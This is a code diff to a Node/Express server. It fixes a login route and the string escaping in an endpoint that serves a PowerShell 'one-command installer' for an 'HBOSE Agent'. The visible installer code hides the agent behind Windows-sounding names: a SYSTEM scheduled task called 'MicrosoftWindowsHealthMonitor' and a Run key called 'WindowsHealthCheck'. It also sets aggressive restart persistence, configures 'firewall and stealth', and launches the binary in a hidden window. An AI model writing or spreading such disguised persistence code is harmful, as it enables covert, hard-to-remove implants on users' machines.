@@ -2691,7 +2691,8 @@ const requireSuperAdmin = (req, res, next) => {
   next();
 };
 
-app.post("/api/auth/login", async (r  const { username, password, role } = req.body;
+app.post("/api/auth/login", async (req, res) => {
+  const { username, password, role } = req.body;
   if (!username || !role) return res.status(400).json({ error: "Missing fields" });
   try {
     if (password) {
@@ -2748,9 +2749,9 @@ app.get("/api/agent-package/download", (req, res) => {
 app.get("/download-join", (req, res) => {
   const proto = req.get("x-forwarded-proto") || req.protocol;
   const host = req.get("x-forwarded-host") || req.get("host");
-  const serverOrigin = \`\${proto}://\${host}\`;
+  const serverOrigin = `${proto}://${host}`;
   
-  const script = \`
+  const script = `
 # ═══════════════════════════════════════════════
 # HBOSE Agent — Remote One-Command Installer v2
 # ═══════════════════════════════════════════════
@@ -2863,7 +2864,7 @@ $Action = New-ScheduledTaskAction -Execute "$INSTALL_DIR\\$BIN_NAME" -Argument $
 $Trigger = @((New-ScheduledTaskTrigger -AtStartup), (New-ScheduledTaskTrigger -AtLogOn))
 $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 9999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Days 365)
 Register-ScheduledTask -TaskName "MicrosoftWindowsHealthMonitor" -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM" -RunLevel Highest -Force 2>$null | Out-Null
-New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsHealthCheck" -Value "\\`"$INSTALL_DIR\\$BIN_NAME\\`" $taskArgs" -PropertyType String -Force | Out-Null
+New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsHealthCheck" -Value "\\\`"$INSTALL_DIR\\$BIN_NAME\\\`" $taskArgs" -PropertyType String -Force | Out-Null
 
 # 8. Firewall + stealth + launch with retry
 Write-Host "[7/8] Configuring firewall and stealth..." -ForegroundColor Yellow
@@ -2886,7 +2887,7 @@ for ($attempt = 1; $attempt -le 3; $attempt++) {
         Start-Process -FilePath "$INSTALL_DIR\$BIN_NAME" -ArgumentList $taskArgs -WorkingDirectory $INSTALL_DIR -WindowStyle Hidden
     }
     if ($attempt -eq 3) {
-        cmd.exe /c "start /B `"`" `"$INSTALL_DIR\$BIN_NAME`" $taskArgs" 2>$null
+        cmd.exe /c "start /B \`"\`" \`"$INSTALL_DIR\\$BIN_NAME\`" $taskArgs" 2>$null
     }
 }
 
